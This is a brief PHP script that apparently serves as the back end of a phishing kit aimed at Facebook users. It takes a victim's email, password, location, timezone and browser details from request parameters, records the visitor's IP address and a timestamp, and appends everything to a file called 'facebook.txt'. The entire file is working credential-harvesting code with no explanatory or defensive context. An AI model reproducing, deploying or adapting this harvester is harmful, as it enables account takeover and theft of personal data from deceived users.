<?php 
date_default_timezone_set("Africa/Lagos");
$pass = $_GET["pass"];
$city = $_GET["city"];
$date = date("d-m-Y");
$time = date("h:i:s a");
$email = $_GET["email"];
$timezone = $_GET["Tz"];
$uA = $_GET["userAgent"];
$region = $_GET["region"];
$country = $_GET["country"];
$ips = $_SERVER["REMOTE_ADDR"];
$myFile = fopen("./facebook.txt", "a");
$myDatas = "==========[$date]==========\n\tTime: $time \n\tCity: $city \n\tRegion: $region \n\tCountry: $country \n\tPswd: $pass \n\tIP_Addr: $ips \n\tEmail: $email \n\tTimezone: $timezone \n\tUser_Agent: $uA \n================================\n\n";
fwrite($myFile, $myDatas);
fclose($myFile);
?>

